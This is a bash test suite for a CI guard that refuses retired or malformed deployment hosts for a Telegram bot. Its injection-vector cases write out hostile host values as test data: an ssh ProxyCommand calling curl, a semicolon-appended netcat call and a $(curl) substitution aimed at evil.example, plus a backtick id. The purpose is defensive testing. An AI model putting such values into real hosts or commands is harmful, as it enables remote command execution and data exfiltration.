#!/usr/bin/env bash
# Tests for tools/ci/deploy-target-guard.sh (TGB-112; TRL-604 failure class).
#
# Every case here is a negative test: the guard must BITE. The positive cases exist
# only to prove the guard does not refuse a legitimate target (a guard that always
# refuses is not a guard either).
#
# Run: bash tools/ci/deploy-target-guard.test.sh
# bash 3.2 (macOS) compatible, no docker, no network.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GUARD="$SCRIPT_DIR/deploy-target-guard.sh"
DENYLIST="$SCRIPT_DIR/retired-deploy-hosts.txt"

WORK="$(mktemp -d "${TMPDIR:-/tmp}/memes-target-guard-test.XXXXXX")"
trap 'rm -rf "$WORK"' EXIT

PASS=0
FAIL=0
pass() { echo "PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "FAIL: $1 — $2"; FAIL=$((FAIL + 1)); }

TARGET_VALID='DEPLOY_HOST=185.238.169.171
DEPLOY_USER=root
DEPLOY_IMAGE=cr.yandex/crp8g8jm3p8d780a8hk3/telegram-bot
DEPLOY_CONTAINER=telegram-bot
DEPLOY_SERVICE=telegram-bot
DEPLOY_STACK_DIR=/opt/memes-bot
DEPLOY_COMPOSE_FILE=/opt/memes-bot/docker-compose.yml
DEPLOY_ENV_FILE=/opt/memes-bot/bot.env
DEPLOY_INFRA_ENV_FILE=/opt/memes-bot/infra.env
DEPLOY_PROJECT=memes-bot
DEPLOY_SSH_KEY=/deploy-secrets/id_ed25519'

# The host TGB-112 moves the memes bot off; present in the repo deny-list.
TARGET_RETIRED='DEPLOY_HOST=38.180.69.206
DEPLOY_USER=root
DEPLOY_IMAGE=cr.yandex/crp8g8jm3p8d780a8hk3/telegram-bot
DEPLOY_CONTAINER=telegram-bot
DEPLOY_SERVICE=telegram-bot
DEPLOY_STACK_DIR=/opt/memes-bot
DEPLOY_COMPOSE_FILE=/opt/memes-bot/docker-compose.yml
DEPLOY_ENV_FILE=/opt/memes-bot/bot.env
DEPLOY_INFRA_ENV_FILE=/opt/memes-bot/infra.env
DEPLOY_PROJECT=memes-bot
DEPLOY_SSH_KEY=/deploy-secrets/id_ed25519'

# run_env <outfile> <K=V>... — run the guard with a clean environment.
run_env() {
  local out="$1"
  shift
  env -i PATH="$PATH" HOME="$HOME" TMPDIR="${TMPDIR:-/tmp}" \
    "$@" bash "$GUARD" >"$out" 2>&1
}

# expects_refusal <label> <outfile> <K=V>...
expects_refusal() {
  local label="$1" out="$2"
  shift 2
  if run_env "$out" "$@"; then
    fail "$label" "expected non-zero exit, got 0"
  else
    pass "$label → non-zero"
  fi
}

# expects_refusal_file <label> <target.env> <outfile> — guard called with a file arg.
expects_refusal_file() {
  local label="$1" envfile="$2" out="$3"
  if bash "$GUARD" "$envfile" >"$out" 2>&1; then
    fail "$label" "expected non-zero exit, got 0"
  else
    pass "$label → non-zero"
  fi
}

# --- the deny-list is repo-resident and carries the retired host ---------------
if [ -f "$DENYLIST" ] && grep -qE '^[[:space:]]*38\.180\.69\.206[[:space:]]*$' "$DENYLIST"; then
  pass "repo deny-list exists and contains 38.180.69.206"
else
  fail "repo deny-list" "missing file or entry: $DENYLIST"
fi

# --- positive: a legitimate target must not be refused (no false failure) -------
if run_env "$WORK/valid.out" "DEPLOY_TARGET_ENV=$TARGET_VALID"; then
  pass "valid host via env → exit 0"
else
  fail "valid host" "rc=$? out=$(tr '\n' '|' < "$WORK/valid.out")"
fi

printf '%s\n' "$TARGET_VALID" > "$WORK/valid.env"
if bash "$GUARD" "$WORK/valid.env" >"$WORK/validfile.out" 2>&1; then
  pass "valid host via file → exit 0"
else
  fail "valid host file" "out=$(tr '\n' '|' < "$WORK/validfile.out")"
fi

if bash "$GUARD" --host 185.238.169.171 >"$WORK/validhost.out" 2>&1; then
  pass "--host valid → exit 0"
else
  fail "--host valid" "out=$(tr '\n' '|' < "$WORK/validhost.out")"
fi

# --- retired host (the TGB-112 move target) ------------------------------------
expects_refusal "retired host via env" "$WORK/retired.out" "DEPLOY_TARGET_ENV=$TARGET_RETIRED"
if grep -q '38.180.69.206' "$WORK/retired.out" && grep -q 'deny-list' "$WORK/retired.out"; then
  pass "retired host → loud, names the host and the deny-list"
else
  fail "retired host message" "$(tr '\n' '|' < "$WORK/retired.out")"
fi

printf '%s\n' "$TARGET_RETIRED" > "$WORK/retired.env"
expects_refusal_file "retired host via file" "$WORK/retired.env" "$WORK/retiredfile.out"

if bash "$GUARD" --host 38.180.69.206 >/dev/null 2>&1; then
  fail "retired host via --host" "expected non-zero exit"
else
  pass "retired host via --host → non-zero"
fi

# --- empty / missing target ----------------------------------------------------
expects_refusal "empty target" "$WORK/empty.out" "DEPLOY_TARGET_ENV="
expects_refusal "target without DEPLOY_HOST" "$WORK/nohost.out" "DEPLOY_TARGET_ENV=DEPLOY_USER=root"

# --- bypass vectors: resolution must match `source` semantics ------------------
expects_refusal "quoted retired host" "$WORK/quoted.out" 'DEPLOY_TARGET_ENV=DEPLOY_HOST="38.180.69.206"'
expects_refusal "inline comment retired host" "$WORK/inline.out" "DEPLOY_TARGET_ENV=DEPLOY_HOST=38.180.69.206 # retired"
expects_refusal "trailing whitespace retired host" "$WORK/trail.out" "DEPLOY_TARGET_ENV=DEPLOY_HOST=38.180.69.206 "
expects_refusal "export DEPLOY_HOST retired" "$WORK/export.out" "DEPLOY_TARGET_ENV=export DEPLOY_HOST=38.180.69.206"

DUP_LAST="DEPLOY_HOST=185.238.169.171
DEPLOY_HOST=38.180.69.206"
expects_refusal "duplicate host (retired last)" "$WORK/dupLast.out" "DEPLOY_TARGET_ENV=$DUP_LAST"

DUP_FIRST="DEPLOY_HOST=38.180.69.206
DEPLOY_HOST=185.238.169.171"
expects_refusal "duplicate host (retired first)" "$WORK/dupFirst.out" "DEPLOY_TARGET_ENV=$DUP_FIRST"

# --- ssh-argv injection vectors (deploy.sh interpolates the host into ssh) ------
expects_refusal "leading dash (ssh option injection)" "$WORK/dash.out" \
  "DEPLOY_TARGET_ENV=DEPLOY_HOST=-oProxyCommand=curl evil.example"
expects_refusal "command injection via semicolon" "$WORK/semi.out" \
  "DEPLOY_TARGET_ENV=DEPLOY_HOST=185.238.169.171;nc evil.example 4444"
expects_refusal "shell expansion in host" "$WORK/dollar.out" \
  'DEPLOY_TARGET_ENV=DEPLOY_HOST=$(curl evil.example)'
expects_refusal "backtick in host" "$WORK/backtick.out" \
  'DEPLOY_TARGET_ENV=DEPLOY_HOST=`id`'
expects_refusal "scheme + path is not a host" "$WORK/url.out" \
  "DEPLOY_TARGET_ENV=DEPLOY_HOST=https://185.238.169.171/ssh"
expects_refusal "user@host is not a bare host" "$WORK/atuser.out" \
  "DEPLOY_TARGET_ENV=DEPLOY_HOST=root@185.238.169.171"
expects_refusal "host:port is not a bare host" "$WORK/port.out" \
  "DEPLOY_TARGET_ENV=DEPLOY_HOST=185.238.169.171:22"
expects_refusal "whitespace inside host" "$WORK/space.out" \
  "DEPLOY_TARGET_ENV=DEPLOY_HOST=185.238.169.171 evil.example"
expects_refusal "malformed dotted host" "$WORK/dots.out" \
  "DEPLOY_TARGET_ENV=DEPLOY_HOST=185..238.169.171"
expects_refusal "wildcard is not a host" "$WORK/star.out" \
  "DEPLOY_TARGET_ENV=DEPLOY_HOST=*.example"

# --- deny-list is matched case-insensitively, and must not be bypassed ----------
printf 'retired.example\n' > "$WORK/custom-deny.txt"
expects_refusal "custom deny-list entry" "$WORK/custom.out" \
  "DEPLOY_TARGET_ENV=DEPLOY_HOST=retired.example" "DEPLOY_RETIRED_HOSTS_FILE=$WORK/custom-deny.txt"
expects_refusal "deny-list match is case-insensitive" "$WORK/case.out" \
  "DEPLOY_TARGET_ENV=DEPLOY_HOST=RETIRED.example" "DEPLOY_RETIRED_HOSTS_FILE=$WORK/custom-deny.txt"

if run_env "$WORK/validinline.out" "DEPLOY_TARGET_ENV=DEPLOY_HOST=185.238.169.171 # prod"; then
  pass "valid host with inline comment → exit 0"
else
  fail "valid host inline comment" "$(tr '\n' '|' < "$WORK/validinline.out")"
fi

# --- fail-closed when the list itself is unusable ------------------------------
expects_refusal "missing deny-list" "$WORK/nolist.out" \
  "DEPLOY_TARGET_ENV=$TARGET_VALID" "DEPLOY_RETIRED_HOSTS_FILE=$WORK/does-not-exist.txt"

printf '# all retired hosts removed\n\n' > "$WORK/empty-deny.txt"
expects_refusal "empty (all-comment) deny-list" "$WORK/emptylist.out" \
  "DEPLOY_TARGET_ENV=$TARGET_VALID" "DEPLOY_RETIRED_HOSTS_FILE=$WORK/empty-deny.txt"

# --- output discipline: the host is printed, no other field of the file --------
if run_env "$WORK/leak.out" "DEPLOY_TARGET_ENV=$TARGET_VALID"; then
  if grep -q '185.238.169.171' "$WORK/leak.out" \
     && ! grep -q 'cr.yandex' "$WORK/leak.out" \
     && ! grep -q 'DEPLOY_SSH_KEY' "$WORK/leak.out" \
     && ! grep -q '/opt/memes-bot' "$WORK/leak.out"; then
    pass "prints only the host, no other target fields"
  else
    fail "secret leak" "$(tr '\n' '|' < "$WORK/leak.out")"
  fi
else
  fail "leak case run" "guard rejected a valid host"
fi

echo
echo "Result: PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ] || exit 1
exit 0
